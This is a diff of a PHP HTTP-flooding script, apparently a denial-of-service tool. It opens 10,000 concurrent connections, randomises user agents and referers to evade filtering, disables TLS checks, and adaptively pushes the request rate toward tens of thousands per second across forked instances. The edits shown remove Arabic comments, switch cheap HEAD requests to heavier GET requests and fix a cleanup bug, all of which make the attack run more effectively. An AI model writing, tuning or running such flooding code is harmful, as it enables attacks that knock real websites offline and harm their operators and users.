@@ -1,7 +1,7 @@
 <?php
 $api_url = "https://labaidgroup.com/files/google_security2025992852991526.php";
-$requests_per_socket_per_second = 10000; // زيادة
-$num_sockets = 10000; // زيادة
+$requests_per_socket_per_second = 10000;
+$num_sockets = 10000;
 $retry_limit = 3;
 $retry_delay = 1;
 $byte_range = "0-1";
@@ -11,7 +11,6 @@ ini_set('memory_limit', '-1');
 set_time_limit(0);
 ignore_user_abort(true);
 
-// زيادة وكيل المستخدم
 $user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
@@ -36,7 +35,6 @@ function get_random_headers($url) {
         "Sec-Fetch-User: ?1"
     ];
     
-    // إضافة مرجع عشوائي
     $referers = [
         "https://www.google.com/search?q=" . urlencode(uniqid()),
         "https://www.bing.com/search?q=" . urlencode(uniqid()),
@@ -96,15 +94,14 @@ function setup_curl_handle($url) {
     global $byte_range;
     $ch = curl_init();
     
-    // إعدادات متقدمة للأداء
     $options = [
         CURLOPT_URL => $url . generate_random_query(),
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_RANGE => $byte_range,
         CURLOPT_SSL_VERIFYPEER => false,
         CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_TIMEOUT => 20, // زيادة إلى 20 ثانية
-        CURLOPT_CONNECTTIMEOUT => 1, // اتصال سريع
+        CURLOPT_TIMEOUT => 20,
+        CURLOPT_CONNECTTIMEOUT => 1,
         CURLOPT_FOLLOWLOCATION => false,
         CURLOPT_HTTPHEADER => get_random_headers($url),
         CURLOPT_FORBID_REUSE => false,
@@ -113,9 +110,9 @@ function setup_curl_handle($url) {
         CURLOPT_BUFFERSIZE => 1024,
         CURLOPT_DNS_CACHE_TIMEOUT => 3600,
         CURLOPT_HEADER => false,
-        CURLOPT_NOBODY => true, // HEAD request فقط - أسرع بكثير
+        CURLOPT_HTTPGET => true,
         CURLOPT_ENCODING => 'gzip',
-        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0, // HTTP/2 إذا متوفر
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
     ];
     
     curl_setopt_array($ch, $options);
@@ -133,14 +130,12 @@ function execute_requests($target_url, $total_duration) {
     $request_count = 0;
     $multi_handle = curl_multi_init();
     
-    // تحسين إعدادات curl_multi
     curl_multi_setopt($multi_handle, CURLMOPT_MAX_TOTAL_CONNECTIONS, $num_sockets);
     curl_multi_setopt($multi_handle, CURLMOPT_MAX_HOST_CONNECTIONS, $num_sockets);
     curl_multi_setopt($multi_handle, CURLMOPT_PIPELINING, CURLPIPE_HTTP1 | CURLPIPE_MULTIPLEX);
     
     $curl_handles = [];
 
-    // إنشاء جميع الاتصالات مسبقاً
     echo "[+] Creating $num_sockets persistent connections...\n";
     for ($i = 0; $i < $num_sockets; $i++) {
         $ch = setup_curl_handle($target_url);
@@ -151,7 +146,6 @@ function execute_requests($target_url, $total_duration) {
     $end_time = $start_time + $total_duration;
     $last_print = $start_time;
     
-    // تتبع أداء RPS
     $rps_history = [];
     $adjustment_factor = 1.0;
 
@@ -161,10 +155,8 @@ function execute_requests($target_url, $total_duration) {
         $loop_start = microtime(true);
         $requests_this_loop = 0;
         
-        // عدد الطلبات في هذه الدورة (معدل متكيف)
         $target_requests_this_loop = (int)($requests_per_socket_per_second * $adjustment_factor);
         
-        // إرسال الطلبات بشكل متوازي
         $active_handles = [];
         
         for ($j = 0; $j < min($target_requests_this_loop, $num_sockets); $j++) {
@@ -178,7 +170,6 @@ function execute_requests($target_url, $total_duration) {
             $requests_this_loop++;
         }
         
-        // تنفيذ جميع الطلبات المتعددة
         $running = 0;
         do {
             $status = curl_multi_exec($multi_handle, $running);
@@ -186,32 +177,25 @@ function execute_requests($target_url, $total_duration) {
                 break;
             }
             
-            // عدم الانتظار - الاستمرار في الإرسال
-            $ready = curl_multi_select($multi_handle, 0.0001); // وقت انتظار قصير جداً
+            $ready = curl_multi_select($multi_handle, 0.0001);
             
-            // إزالة الطلبات المكتملة
             while ($info = curl_multi_info_read($multi_handle)) {
                 if ($info['result'] === CURLE_OK) {
-                    // نجاح - لا تفعل شيئاً
                 }
                 curl_multi_remove_handle($multi_handle, $info['handle']);
             }
         } while ($running > 0 && (microtime(true) - $loop_start) < 0.1);
         
-        // تنظيف المقابض النشطة
         foreach ($active_handles as $ch) {
             curl_multi_remove_handle($multi_handle, $ch);
         }
         
-        // حساب التوقيت والتكيف
         $loop_duration = microtime(true) - $loop_start;
         $current_rps = $requests_this_loop / max(0.001, $loop_duration);
         
-        // حفظ التاريخ للتكيف
         $rps_history[] = $current_rps;
         if (count($rps_history) > 10) array_shift($rps_history);
         
-        // التكيف الديناميكي
         $avg_rps = array_sum($rps_history) / max(1, count($rps_history));
         if ($avg_rps < $requests_per_socket_per_second * 0.8) {
             $adjustment_factor = min(2.0, $adjustment_factor * 1.1);
@@ -219,7 +203,6 @@ function execute_requests($target_url, $total_duration) {
             $adjustment_factor = max(0.5, $adjustment_factor * 0.9);
         }
         
-        // تحديث الإحصائيات كل ثانية
         $current_time = microtime(true);
         if ($current_time - $last_print >= 1) {
             $total_elapsed = $current_time - $start_time;
@@ -237,8 +220,7 @@ function execute_requests($target_url, $total_duration) {
             $last_print = $current_time;
         }
         
-        // تأخير دقيق للحفاظ على المعدل
-        $target_loop_time = 0.01; // 10ms لكل دورة
+        $target_loop_time = 0.01;
         $actual_loop_time = microtime(true) - $loop_start;
         $sleep_time = max(0, $target_loop_time - $actual_loop_time);
         
@@ -247,9 +229,8 @@ function execute_requests($target_url, $total_duration) {
         }
     }
     
-    // تنظيف
     foreach ($curl_handles as $ch) {
-        curl_multi_remove_handle($multi_handles, $ch);
+        curl_multi_remove_handle($multi_handle, $ch);
         curl_close($ch);
     }
     curl_multi_close($multi_handle);
@@ -267,7 +248,6 @@ function execute_requests($target_url, $total_duration) {
     return $request_count;
 }
 
-// تحسين إعدادات النظام
 if (function_exists('opcache_reset')) opcache_reset();
 if (function_exists('gc_disable')) gc_disable();
 
@@ -277,7 +257,6 @@ echo "Memory limit: " . ini_get('memory_limit') . "\n";
 echo "Max execution time: " . ini_get('max_execution_time') . "\n\n";
 flush();
 
-// تشغيل متعددة إذا أمكن
 $max_instances = 1;
 if (PHP_SAPI === 'cli' && extension_loaded('pcntl')) {
     $max_instances = 4;
